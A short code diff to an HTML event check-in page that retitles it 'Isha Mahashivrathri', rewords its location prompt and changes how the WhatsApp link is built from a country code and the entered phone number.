@@ -70,8 +70,8 @@
 <body>
 
 <div class="container">
-  <h2>Event Check-in</h2>
-  <p>Share your live location via WhatsApp</p>
+  <h2>Isha Mahashivrathri</h2>
+  <p>Get your Current location via WhatsApp</p>
 
   <input type="text" id="name" placeholder="Full Name">
   <input type="tel" id="phone" placeholder="Mobile Number (10 digits)" maxlength="10">
@@ -157,7 +157,7 @@
     }).catch(()=>{});
 
     /* WhatsApp message to SAME number */
-    const waNumber = "91" + phone;
+    const COUNTRY_CODE = "91";
 
     const message =
       `*Event Check-In*%0A` +
@@ -170,9 +170,12 @@
     updateUI("Opening WhatsApp…", "info");
 
     window.location.href =
-      `https://wa.me/${waNumber}?text=${message}`;
+      `https://wa.me/${COUNTRY_CODE}${phone}?text=${encodeURIComponent(message)}`;
+
+    
   }
 </script>
 
 </body>
 </html>
+
